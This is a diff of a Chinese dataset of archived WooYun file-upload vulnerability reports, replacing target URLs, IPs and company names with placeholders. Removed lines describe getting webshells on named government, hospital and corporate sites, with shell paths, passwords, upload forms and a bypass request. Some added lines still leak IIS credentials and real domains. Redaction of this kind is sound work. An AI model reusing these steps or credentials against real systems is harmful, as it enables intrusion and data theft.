-**详情**: fck路径http://www.xmwsrc.com/admin/fckeditorsampleshttp://www.xmwsrc.com/admin/fckeditor/_samples/default.html来，利用samples看看是不是能发现什么有趣的文件果然不出所料http://www.xmwsrc.com/UploadFiles/file/1.asp/asp.jpg无法连接，有点意思，换成1.cer试试？一句话地址：http://www.xmwsrc.com/UploadFiles/file/1.cer/hlnjwl.jpg
+**详情**: fck路径https://example.com/[已脱敏]
 
 **POC**: 上刀权限大已经有很多人光顾了-养马场
 
@@ -12610,7 +12610,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题分站上传漏洞链接：1、http://msla.hz.letv.com/upload.jsp?action=upfile2、通过上传1个正常的jpg，分析获取到实际的图片上传路径3、查看网站某图片的URL地址拼接图片上传路径，将图片中的部分数值进行替换即可。4、将上传页面另存为本地，使用UE对上传的后缀名进行修改，将pnp改成需要上传的jsp5、上传jsp文件后，使用菜刀连接6、数据库ip地址、用户名密码信息泄露
+**详情**: 问题分站上传漏洞链接：1、https://example.com/[已脱敏]
 
 **POC**: 已经证明。
 
@@ -12656,7 +12656,7 @@
 
 **详情**: 全峰快递某分站上传漏洞
 
-**POC**: http://122.225.104.50:8080/templates/index/hrlogon.jsp扫描目录发现有FCKeditorhttp://122.225.104.50:8080/fckeditor//editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/目录可以任意遍历http://122.225.104.50:8080/fckeditor//editor/filemanager/browser/default/con
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -12676,9 +12676,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 23万的东西这么垃圾 不解释http://203.195.196.198:81/kindeditor/asp/demo.asphttp://203.195.196.198:81/kindeditor/asp.net/demo.aspxhttp://203.195.196.198:81/kindeditor/examples/custom-plugin.htmlhttp://203.195.196.198:81/kindeditor/examples/custom-theme.htmlhttp://203.195.196.198:81/kindeditor/examples/default.htmlhttp://203.195.196.198:81/kindeditor/examples/dynamic-load.htmlhttp://203.195.196.198:81/kindedito
+**详情**: 23万的东西这么垃圾 不解释http://[IP已脱敏]
 
-**POC**: 23万的东西这么垃圾 不解释http://203.195.196.198:81/kindeditor/asp/demo.asphttp://203.195.196.198:81/kindeditor/asp.net/demo.aspxhttp://203.195.196.198:81/kindeditor/examples/custom-plugin.htmlhttp://203.195.196.198:81/kindeditor/examples/custom-theme.htmlhttp://203.195.196.198:81/kindeditor/examples/default.ht
+**POC**: 23万的东西这么垃圾 不解释http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -12686,8 +12686,8 @@
 ---
 
 ---
-### [wooyun-2014-082366] 淘宝某接口通过文件上传可盗取用户cookies信息
-**厂商**: 淘宝网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2014-082366] 某电商平台某接口通过文件上传可盗取用户cookies信息
+**厂商**: 某电商平台网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -12700,7 +12700,7 @@
 
 **详情**: 该漏洞存在手机旺信发送图片的上传接口中，由于没有限制上传文件类型，虽然JSP等脚本文件不能执行，但可以上传HTML文件，可执行JS代码，进而可以盗取用户cookies等敏感信息！上传接口：POST /ul HTTP/1.1Connection: Keep-AliveContent-Type: multipart/form-data; boundary=2344fcfd9fe0468182661bae96c90690Accept-Charset: utf-8Content-Range: bytes 0-20459/21262User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.0.2; sdk Build/ICS_MR0)Host: slice.wangxin.taobao.comAccept-Encoding: gzipContent-Length: 
 
-**POC**: 写了个上传测试程序http://yunpan.cn/csIwcLgPSLWPm （提取码：f15a）下面两个是我自己上传后的链接：http://interface.im.taobao.com/mobileimweb/fileupload/downloadPriFile.do?type=2&fileId=86a821fd237f976a17a55fb463cb183d.html&suffix=html&width=78&height=26&mediaSize=220http://interface.im.taobao.com/mobileimweb/fileupload/downloadPriF
+**POC**: 写了个上传测试程序https://example.com/[已脱敏] （提取码：f15a）下面两个是我自己上传后的链接：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12742,7 +12742,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x1http://www.wdghy.com/wdghyhd/register2.jsp?type=1供方注册处,文件后缀在请求链接中,添加jsp后缀就可以上传.http://www.wdghy.com/wdghyhd/uploadfile.jsp?method=goFileUpload&fileType=jpg&maxSize=5&eleid=businesslicense&abc=0.18216927155681018需要猜路径....0x2注入.http://www.vans-china.cn登陆注入.
+**详情**: 0x1https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12764,9 +12764,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注意与其不同WooYun: 某通用型创新管理系统普通帐号可越权查看及修改任意用户（影响多所高等院校）官网：http://www.changedu.com/由南京先极科技有限公司开发的大学生创新创业训练项目智能管理系统关键字：大学生创新创业项目智能管理系统影响案例：http://desktop.nju.edu.cn/cx/ 南京大学大学生创新创业训练智能管理系统http://dxscx.forestpolice.net/ 南京森林警察学院大学生创新创业训练智能管理系统http://180.209.64.18/cxcy/Index.aspx 南京邮电大学大学生创新创业训练智能管理系统http://210.26.14.200/ 西北民族大学大学生创新创业训练项目智能管理系统http://sjjx.njit.edu.cn/cx/ 南京工程学院大学生创新训练智能管理系统http://nausrt.n
+**详情**: 注意与其不同WooYun: 某通用型创新管理系统普通帐号可越权查看及修改任意用户（影响多所高等院校）官网：https://example.com/[已脱敏] 南京大学大学生创新创业训练智能管理系统https://example.com/[已脱敏] 南京森林警察学院大学生创新创业训练智能管理系统http://[IP已脱敏] 南京邮电大学大学生创新创业训练智能管理系统http://[IP已脱敏] 西北民族大学大学生创新创业训练项目智能管理系统https://example.com/[已脱敏] 南京工程学院大学生创新训练智能管理系统http://nausrt.n
 
-**POC**: 以西北民族大学大学生创新创业训练项目智能管理系统为例http://210.26.14.200入侵思路：试探admin弱口令，及登录注入，无突破，想到大部分校园系统学号即密码，又懒得去找，最后发现系统有个操作手册，下载之，发现了测试帐号1#操作手册泄漏测试用户及密码http://210.26.14.200/UpLoadFile/690476.doc测试帐号，可通用于大部分系统s1/1s2/1s1/s1s2/s2st1/1等等2#未授权访问地址（有多处，无需登陆，以下仅举关键2处）：2.1#http://210.26.14.200/Admin/SelStudent.aspx2.2#http://2
+**POC**: 以西北民族大学大学生创新创业训练项目智能管理系统为例http://[IP已脱敏]入侵思路：试探admin弱口令，及登录注入，无突破，想到大部分校园系统学号即密码，又懒得去找，最后发现系统有个操作手册，下载之，发现了测试帐号1#操作手册泄漏测试用户及密码http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -12788,7 +12788,7 @@
 
 **详情**: 国家互联网应急中心
 
-**POC**: img 此次漏洞结合了http://wooyun.org/bugs/wooyun-2010-079578大牛在这个目录下还有个上传没发现，搜索了下没有看到重复。上传文件：//ycportal/jsp/AD/ADadd.jsp有的主页文件不一样但是都在jsp/AD/ADadd.jspshell地址：路径为 /ycportal/styleimages/adimages/+文件名我用案例一来演示下：http://www.rzdonggang.gov.cn/ycportal/jsp/AD/ADadd.jsp?checkbox_id=10然后上传截断：上传1.jsp.jpg得到shell地址：http:
+**POC**: img 此次漏洞结合了https://example.com/[已脱敏] /ycportal/styleimages/adimages/+文件名我用案例一来演示下：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12808,9 +12808,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.gzgrain.com/（广州穂粮集团网址）http://www.gzgrain.com/pic_news/chubei1.asp?xm_table=jieyun（出现问题的地址）点击签名会提示你已经签字成功（签名的意思就是审批吧），同时状态会变成已读，文件可删除确定没敢点
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.gzgrain.com/（广州穂粮集团网址）http://www.gzgrain.com/pic_news/chubei1.asp?xm_table=jieyun（出现问题的地址）点击签名会提示你已经签字成功，同时状态会变成已读，文件可删除确定没敢点
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12854,7 +12854,7 @@
 
 **详情**: 今天偶然发现的，不知道有没有前辈早先提交了 但是希望能获得乌云邀请码一枚选择—在线投稿—底部有个上传图片、点编辑器那个也可以用burp suite 抓包上传 第一次提交漏洞 可能顺序有点乱请见谅 ！希望能获取一枚邀请码！！
 
-**POC**: http://www.2cto.com/uploadfile/2013/0320/20130320054626462.cdx
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12874,7 +12874,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随便注册一个号，然后到http://www.vasee.com/event/addevent.jsp（发布活动）点击海报上传。截取封包，把jpg改成jsp,或者任意格式，GOhttp://pics.vasee.com/event/201408215094627272.jsp
+**详情**: 随便注册一个号，然后到https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12898,7 +12898,7 @@
 
 **详情**: 利用方法：WooYun: TRS WCM 6.X系统任意文件写入漏洞利用工具：soap ui
 
-**POC**: mask 区域*****^的servi*****1.://**.**.**//www.nmgat.gov.cn/wcm/services</code>_*****le获取^**********2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.or**********v:Heade**********env:Bo**********uot;http://schemas.xmlsoa**********"http://schemas.xmlsoap.org/soap**********enc="http://schemas.xmlsoap*
+**POC**: mask 区域*****^的servi*****1.://**.**.**//www.nmgat.gov.cn/wcm/services</code>_*****le获取^**********2001/XMLSchema" xmlns:soapenv="https://example.com/[已脱敏]"https://example.com/[已脱敏]"https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12962,7 +12962,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 查看框架源码，ajax判断路径，http://demo.metinfo.cn/admin/system/uploadfile.php?anyid=14&lang=cn&fileurl=templates得到路径界面风格处，可以上传新的风格，a.php;a.jig打包成压缩文件上传，上传后会自动加上时间和.bak，如：http://demo.metinfo.cn/templates/x.php;x.jpg2012-01-01_1126.bak 注：会提示上传不成功，不管他，菜刀直接连.
+**详情**: 查看框架源码，ajax判断路径，https://example.com/[已脱敏] 注：会提示上传不成功，不管他，菜刀直接连.
 
 **POC**: (见原文)
 
@@ -12986,7 +12986,7 @@
 
 **详情**: 某房产系统上传漏洞
 
-**POC**: 上传漏洞一：ftb.imagegallery.aspx这个位置在后台有好几个地方admini/zwgk/ftb.imagegallery.aspxadmini\newsTopic\ftb.imagegallery.aspxadmini\news\ftb.imagegallery.aspx有些后台被修改地址，你们懂得一张图告诉你拿shell 我们用来演示http://tgfgj.com/任意文件上传，shell地址：http://tgfgj.com/images/cun.aspx上案例：http://61.180.36.38/admini/zwgk/ftb.imagegallery.aspxht
+**POC**: 上传漏洞一：ftb.imagegallery.aspx这个位置在后台有好几个地方admini/zwgk/ftb.imagegallery.aspxadmini\newsTopic\ftb.imagegallery.aspxadmini\news\ftb.imagegallery.aspx有些后台被修改地址，你们懂得一张图告诉你拿shell 我们用来演示https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13050,9 +13050,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 系统地址：http://cw.crcgas.com/扫描系统的时候发现了一个上传页面http://cw.crcgas.com/up.asp上传个图片，发现可以正常上传，而且服务器有返回路径，所以我尝试着抓包改包
+**详情**: 系统地址：https://example.com/[已脱敏]
 
-**POC**: 一句话地址：http://cw.crcgas.com/moban-image/01.asp密码：1在某文件夹内发现N多财务数据文件大量财务数据
+**POC**: 一句话地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13072,9 +13072,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天朋友发来个黑页 让我帮看看是怎么导致的 于是有了这次检测.大概在这个二级域名上转了圈 发现了这个地方有上传http://vote.runsky.com/2012/05/pijiu/index.php?app=baby&act=babybm很自然的抓包检测改包 1.jpg改成1.php 提交菜刀连接
+**详情**: 今天朋友发来个黑页 让我帮看看是怎么导致的 于是有了这次检测.大概在这个二级域名上转了圈 发现了这个地方有上传https://example.com/[已脱敏] 1.jpg改成1.php 提交菜刀连接
 
-**POC**: 今天朋友发来个黑页 让我帮看看是怎么导致的 于是有了这次检测.大概在这个二级域名上转了圈 发现了这个地方有上传http://vote.runsky.com/2012/05/pijiu/index.php?app=baby&act=babybm很自然的抓包检测改包 1.jpg改成1.php 提交菜刀连接
+**POC**: 今天朋友发来个黑页 让我帮看看是怎么导致的 于是有了这次检测.大概在这个二级域名上转了圈 发现了这个地方有上传https://example.com/[已脱敏] 1.jpg改成1.php 提交菜刀连接
 
 **绕过**: 直接利用
 
@@ -13116,9 +13116,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.scgrain.gov.cnhttp://www.hsjyj.gov.cn:8091http://ajj.ninghai.gov.cnhttp://www.wsgndj.gov.cnhttp://jktj.zjwjw.gov.cnhttp://tzb.ujn.edu.cn上工具:
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://tzb.ujn.edu.cn//https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file/\zy.asp\/20150722165124.jpghttp://www.hsjyj.gov.cn:8091//Files/20150722165124.asphttp://ajj.ninghai.gov.cn//UserFiles/20150722165125.asphttp://www.wsgndj.gov.cn//UserFiles/20150722165125.asppass:xiwang
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13138,7 +13138,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某系统任意文件上传导致代码执行涉及不少GOV站点啊~厂商：http://www.06330633.net/ 东日照和和科技有限公司Upload Bug:/adminqibo5/Edit/editor/resurm_upfile.asp  开始我看到adminqibo5还以为齐博CMS  后来发现网上有这套系统的源码官方也是用这套CMS的，特征是“mucc”、官方有案例：case:  (涉及不少gov，有些gov域名也是)http://www.06330633.net/adminqibo5/Edit/editor/resurm_upfile.asp  官网也存在http://www.jxweisheng.gov.cn/adminqibo5/Edit/editor/resurm_upfile.asphttp://www.xiazhuang.gov.cn/adminqibo5/Edit/edit
+**详情**: 某系统任意文件上传导致代码执行涉及不少GOV站点啊~厂商：https://example.com/[已脱敏] 东日照和和科技有限公司Upload Bug:/adminqibo5/Edit/editor/resurm_upfile.asp  开始我看到adminqibo5还以为齐博CMS  后来发现网上有这套系统的源码官方也是用这套CMS的，特征是“mucc”、官方有案例：case:  (涉及不少gov，有些gov域名也是)https://example.com/[已脱敏]  官网也存在https://example.com/[已脱敏]
 
 **POC**: 这个系统的漏洞和动感购物商城的漏洞原理是一个样子的，通过00截断上传目录可导致上传任意文件，所以使用明小子动感购物商城exp就可以直接getshell，我测试其中一个案例：1、返回的文件名是diy.asp
 
@@ -13160,7 +13160,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 打开公告中上传图片的页面查看url如下：http://127.0.0.1:7001/defaultroot/public/jsp/multiupload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jpeg,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0将url中得fileType参数后面加上.jsp，刷新一下，即可上传jsp文件。
+**详情**: 打开公告中上传图片的页面查看url如下：http://[IP已脱敏]
 
 **POC**: 成功上传asp、jsp文件！
 
@@ -13184,7 +13184,7 @@
 
 **详情**: 美的集团旗下某产业网站上传漏洞
 
-**POC**: http://202.104.30.157/这是美的集团旗下的产业，公司介绍也是写着美的，http://202.104.30.157/admin/index.jsp  后台打着美的的LOGOfckeditor 有漏洞查看目录http://202.104.30.157/fckeditor//editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../admin也可以直接上马http://202.104.30.157/UserFiles/
+**POC**: http://[IP已脱敏]  后台打着美的的LOGOfckeditor 有漏洞查看目录http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -13204,9 +13204,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国兵器装备集团公司（http://www.csgc.com.cn）某系统多处漏洞缺陷展示http://www.csgc.com.cn:8080/bsweb/login.jsp1.struts漏洞:http://www.csgc.com.cn:8080/bsweb/login.action2.大批四位帐号弱口令:如zgca-1234563.任意文件上传.同样可导致任意代码执行，4.任意文件下载:上传文件后，点击连接URL可任意下载文件http://www.csgc.com.cn:8080/bsweb/download?path=
+**详情**: 中国兵器装备集团公司（https://example.com/[已脱敏]
 
-**POC**: 中国兵器装备集团公司（http://www.csgc.com.cn）某系统多处漏洞缺陷展示http://www.csgc.com.cn:8080/bsweb/login.jsp1.struts漏洞:http://www.csgc.com.cn:8080/bsweb/login.action2.大批四位帐号弱口令:如zgca-1234563.任意文件上传.同样可导致任意代码执行，4.任意文件下载:上传文件后，点击连接URL可任意下载文件http://www.csgc.com.cn:8080/bsweb/download?path=
+**POC**: 中国兵器装备集团公司（https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13228,7 +13228,7 @@
 
 **详情**: 由于使用了早期版本的fckeditor。导致可以通过文件名截断，绕过后缀名验证，上传任意文件。
 
-**POC**: 提交如下http包，即可上传shellhttp://jdkcn.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Image/b.jspPOST /FCK/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=Image&CurrentFolder=%2F HTTP/1.1Accept: */*Accept-Language: en-US,zh-cn;q=0.5User-Agent: Mozilla/4.0 (comp
+**POC**: 提交如下http包，即可上传shellhttps://example.com/[已脱敏] /FCK/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=Image&CurrentFolder=%2F HTTP/1.1Accept: */*Accept-Language: en-US,zh-cn;q=0.5User-Agent: Mozilla/4.0 (comp
 
 **绕过**: 过滤绕过, 截断攻击
 
@@ -13248,9 +13248,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 蒙牛某个站任意上传http://sq.mengniu.com.cn/File/ 任意上传
+**详情**: 蒙牛某个站任意上传https://example.com/[已脱敏] 任意上传
 
-**POC**: shell:http://sq.mengniu.com.cn/Upload/Files/2015/1223/201512231450875024965.asp 密码:pass
+**POC**: shell:https://example.com/[已脱敏] 密码:pass
 
 **绕过**: 直接利用
 
@@ -13270,9 +13270,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先 在 http://www.shopnum1.com/product.html 页面查看任意产品详细说明。按说明 提示登录后台。。在后台功能页面->附件管理->附件列表可以直接上传.aspx 后缀木马
+**详情**: 首先 在 https://example.com/[已脱敏] 页面查看任意产品详细说明。按说明 提示登录后台。。在后台功能页面->附件管理->附件列表可以直接上传.aspx 后缀木马
 
-**POC**: http://www.nrqiang.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20110718221756898.aspx
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13294,7 +13294,7 @@
 
 **详情**: 看下面
 
-**POC**: 漏洞地址http://www.zset.gov.cn:81/machine/regedit.aspx然后用菜刀连接通过翻阅目录查找mssql配置文件，发现本网站的用户无法连接上，于是去其他网站找了个sa连接数据库然后通过mssql直接就可以提权了，或者通过大马里面带的IISPY直接读取IIS用户发现管理员一枚，如下图System权限加用户开3389那些什么的就不说了，自己开了然后又关了，没有搞破坏。管理自己检查一下吧，我不知道有没有恢复完全。由于自己系统的lcx打不开就没有弄转发了，这里就不截图了。总的来说这个服务器还是挺多站点的这一也是个邮件服务器算是比较重要的一个服务器。希望管理员注意数据
+**POC**: 漏洞地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13336,9 +13336,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 桃源县阳光“三农”信息服务网Netcms oday上传漏洞http://cwgk.taoyuan.gov.cn/user/login.aspx点注册之后点击发表文章然后在站内信息那块， 给自己发送个站内信，附件里直接传马。读取IIS信息，发现服务器存在30个GOV站。。
+**详情**: 桃源县阳光“三农”信息服务网Netcms oday上传漏洞https://example.com/[已脱敏] 给自己发送个站内信，附件里直接传马。读取IIS信息，发现服务器存在30个GOV站。。
 
-**POC**: ID IIS_USER IIS_PASS Domain Path1 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 :80: c:\inetpub\wwwroot2 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 218.75.147.12:80:www.tygtzy.gov.cn218.75.147.12:80:tygtzy.gov.cn218.75.147.12:80:tygtj.firstcode.org E:\wwwroot\zxlin25\PHP\tygtj3 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 21
+**POC**: ID IIS_USER IIS_PASS Domain Path1 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 :80: c:\inetpub\wwwroot2 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 [IP已脱敏]:www.tygtzy.gov.cn218.75.147.12:80:tygtzy.gov.cn218.75.147.12:80:tygtj.firstcode.org E:\wwwroot\zxlin25\PHP\tygtj3 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 21
 
 **绕过**: 直接利用
 
@@ -13346,8 +13346,8 @@
 ---
 
 ---
-### [wooyun-2011-02923] 腾讯CF一处上传页面泄露
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2011-02923] 某互联网公司CF一处上传页面泄露
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -13358,9 +13358,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯CF一处上传页面泄露
+**详情**: 某互联网公司CF一处上传页面泄露
 
-**POC**: http://app.cf.qq.com/act/a20080910league/admin/upload_pic.htm
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13382,7 +13382,7 @@
 
 **详情**: 注册进去会员中心发微薄的地方存在任意文件上传漏洞
 
-**POC**: http://www.5a.com.cn/phpinfo.php专业用户还蛮多的
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13402,9 +13402,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 管理后台的站点http://admin.super8.com.cn中的fckeditor connector.asp文件没有删除，导致各种上传，不管是利用IIS解析漏洞还是最新的FCKEditor ASP上传绕过漏洞都可以上传木马。随手上传了个图片马。http://admin.super8.com.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://admin.super8.com.cn/fckeditor/editor/filemanager/connectors/asp/connector.asp看了下Image文件和File文件，各种马各种测试文件。
+**详情**: 管理后台的站点https://example.com/[已脱敏] connector.asp文件没有删除，导致各种上传，不管是利用IIS解析漏洞还是最新的FCKEditor ASP上传绕过漏洞都可以上传木马。随手上传了个图片马。https://example.com/[已脱敏]
 
-**POC**: 管理后台的站点http://admin.super8.com.cn中的fckeditor connector.asp文件没有删除，导致各种上传，不管是利用IIS解析漏洞还是最新的FCKEditor ASP上传绕过漏洞都可以上传木马。随手上传了个图片马。http://admin.super8.com.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://admin.super8.com.cn/fckeditor/editor/filemanager/connectors/a
+**POC**: 管理后台的站点https://example.com/[已脱敏] connector.asp文件没有删除，导致各种上传，不管是利用IIS解析漏洞还是最新的FCKEditor ASP上传绕过漏洞都可以上传木马。随手上传了个图片马。https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -13448,7 +13448,7 @@
 
 **详情**: 网站 www.51suizhen.com 主要存在以下漏洞：1. 目录浏览漏洞2. 应用备份文件下载3. 任意文件上传漏洞4. 日志文件泄露5. MySQL数据库允许远程连接6. 测试页面泄露邮箱帐号密码
 
-**POC**: 1. 目录浏览2. 应用备份文件下载http://119.254.111.103/background_bak201507161500.tar.gzhttp://119.254.111.103/package_201504220808.tar.gzhttp://119.254.111.103/sft_bak201506101755.tar.gz... ...3. 任意文件上传漏洞访问下面的地址：http://119.254.111.103/sft/test01.php（每个上传表单均可上传任意文件）直接浏览文件上传，提示上传成功，并给出访问URL：使用菜刀成功连接：4. 日志文件泄露http:
+**POC**: 1. 目录浏览2. 应用备份文件下载http://[IP已脱敏] ...3. 任意文件上传漏洞访问下面的地址：http://[IP已脱敏] 日志文件泄露http:
 
 **绕过**: 直接利用
 
@@ -13470,7 +13470,7 @@
 
 **详情**: #1 漏洞产生/module/mod_media.phpflash_picker() 和 image_picker() 两个函数image_picker() 函数$typeArr = array('image/jpeg','image/pjpeg');$flash_typeArr = array('image/jpeg','image/pjpeg');$file_info =& ParamHolder::get('localfile', array(), PS_FILES);$file_info['name'] = Toolkit::changeFileNameChineseToPinyin($file_info['name']);if ( sizeof($file_info) > 0 && isset($file_info['name']) ){// 文件大小if ( ($file_in
 
-**POC**: #2 漏洞利用将如下代码保存为upload.htm<form enctype="multipart/form-data" method="post" action="http://www.vulns.org/sitestar/index.php?_m=mod_media&_a=flash_picker">Flash:<input type="file" name="localfile"/><input id="Upload" type="submit" value="Upload"></form>访问upload.php并上传文件,上传的时候用Burpsuite 抓包 并修改点击Forward
+**POC**: #2 漏洞利用将如下代码保存为upload.htm<form enctype="multipart/form-data" method="post" action="https://example.com/[已脱敏]">Flash:<input type="file" name="localfile"/><input id="Upload" type="submit" value="Upload"></form>访问upload.php并上传文件,上传的时候用Burpsuite 抓包 并修改点击Forward
 
 **绕过**: 直接利用
 
@@ -13512,7 +13512,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 行名行号管理系统http://210.74.35.73/test.jsp自定义路径，无过滤上传。
+**详情**: 行名行号管理系统http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -13588,8 +13588,8 @@
 ---
 
 ---
-### [wooyun-2011-01335] 腾讯动漫频道未授权上传
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 未授权访问/权限绕过
+### [wooyun-2011-01335] 某互联网公司动漫频道未授权上传
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 未授权访问/权限绕过
 
 **元思考**: 触发信号: 上传功能
 
@@ -13600,9 +13600,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传地址：http://mycomic.qq.com/manage/newbook.php演示：http://data1.comic.qq.com/2011-02-17/17/5075555a750f4ef2f56eac867beea498.jpg
+**详情**: 上传地址：https://example.com/[已脱敏]
 
-**POC**: 上传地址：http://mycomic.qq.com/manage/newbook.php演示：http://data1.comic.qq.com/2011-02-17/17/5075555a750f4ef2f56eac867beea498.jpg
+**POC**: 上传地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13622,9 +13622,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用友GRP-U8 财务管理软件该servlet存在漏洞，可直接上传任意文件到服务器/UploadFile随便构造一个表单，上传任意文件即可<html><form method="post" action="http://210.44.112.101/UploadFile" encType="multipart/form-data"><input type="file" name="rfile_name"/><input type="submit" value="upload"/></form></html>上传后的最终路径为：https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/+上传的文件名这里为：http://210.44.112.101https://wooyun-img.oss-cn-beijing.aliyuncs.com/u
+**详情**: 用友GRP-U8 财务管理软件该servlet存在漏洞，可直接上传任意文件到服务器/UploadFile随便构造一个表单，上传任意文件即可<html><form method="post" action="http://[IP已脱敏] encType="multipart/form-data"><input type="file" name="rfile_name"/><input type="submit" value="upload"/></form></html>上传后的最终路径为：https://example.com/[已脱敏]
 
-**POC**: http://210.44.112.101https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/chopper.jsp chopper
+**POC**: http://[IP已脱敏]https://example.com/[已脱敏] chopper
 
 **绕过**: 直接利用
 
@@ -13666,9 +13666,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞细节：这个漏洞前两天复现的。www.54doctor.net我是医生cms通用型上传点。http://www.54doctor.net/News/Main?siteId=6 都是医院站点。上传点：ImageUpLoad/Index?ImageId=AvatarImageUrlhttp://www.jst-hosp.com.cn/ImageUpLoad/Index?ImageId=AvatarImageUrlhttp://www.zjuch.cn/ImageUpLoad/Index?ImageId=AvatarImageUrlhttp://www.bjyah.com/ImageUpLoad/Index?ImageId=AvatarImageUrlhttp://www.pkuh6.cn/ImageUpLoad/Index?ImageId=AvatarImageUrl上传利用方式：服务器类型
+**详情**: 漏洞细节：这个漏洞前两天复现的。www.54doctor.net我是医生cms通用型上传点。https://example.com/[已脱敏] 都是医院站点。上传点：ImageUpLoad/Index?ImageId=AvatarImageUrlhttps://example.com/[已脱敏]
 
-**POC**: shell地址：http://www.jst-hosp.com.cn/Areas/News/cjk.cerhttp://www.zjuch.cn/Areas/News/234.aspxhttp://www.bjyah.com/Areas/News/234.aspxhttp://www.pkuh6.cn/Areas/News/234.aspx现在已经被删了，不知道漏洞修复没有修复，肯定还有站点没有修复吧，通知下厂商。
+**POC**: shell地址：https://example.com/[已脱敏]
 
 **绕过**: 截断攻击
 
@@ -13688,7 +13688,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 四川省知识产权局任意上传文件获取Webshllhttp://www.scipo.gov.cn/adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.asp
+**详情**: 四川省知识产权局任意上传文件获取Webshllhttps://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13710,7 +13710,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
